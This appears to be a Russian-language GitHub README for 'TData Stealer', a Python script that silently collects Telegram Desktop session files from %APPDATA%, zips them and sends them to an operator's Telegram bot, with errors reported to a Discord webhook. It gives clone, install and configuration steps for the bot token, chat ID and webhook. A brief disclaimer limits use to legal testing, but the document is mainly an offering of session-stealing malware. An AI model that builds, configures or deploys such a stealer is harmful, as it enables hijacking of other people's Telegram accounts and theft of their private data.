TData Stealer
Скрипт для выборки и отправки важных файлов TData из Telegram Desktop с уведомлением об ошибках в Discord.
Обзор
TData Stealer предназначен для извлечения ключевых данных из Telegram Desktop и отправки их через Telegram-бота. Ошибки логируются в Discord Webhook. Используйте только для тестирования безопасности на своих устройствах с разрешения.
Функции

Поиск директории TData в %APPDATA%/Telegram Desktop
Фильтрация файлов по шаблонам и ограничениям размера
Формирование ZIP-архивов (максимум 40 MB)
Отправка архивов через Telegram-бота
Уведомления об ошибках в Discord Webhook

Установка

Клонируйте репозиторий:
git clone https://github.com/disconnect-dev/Telegram-Stealer.git
cd Telegram-Stealer


Установите зависимости (если требуется):
pip install -r requirements.txt



Настройки
Настройте параметры в файле main.py:



Параметр
Описание
Пример значения



BOT_TOKEN
Токен Telegram-бота
"123456789:ABCdefGhIJKlmNoPQRsTUvWxYZ"


USER_ID
ID пользователя или чата
123456789


DISCORD_WEBHOOK_URL
URL Discord Webhook для ошибок
"https://discord.com/api/webhooks/..."


Запуск
python main.py

Скрипт работает бесшумно, выводя ошибки только в Discord.
Предупреждения
Использование для кражи данных без разрешения незаконно и нарушает правила Telegram. Применяйте только для легального тестирования безопасности.
Лицензия
Распространяется под лицензией MIT. См. файл LICENSE для деталей.
Вклад
Открывайте Issues или Pull Requests для улучшений.
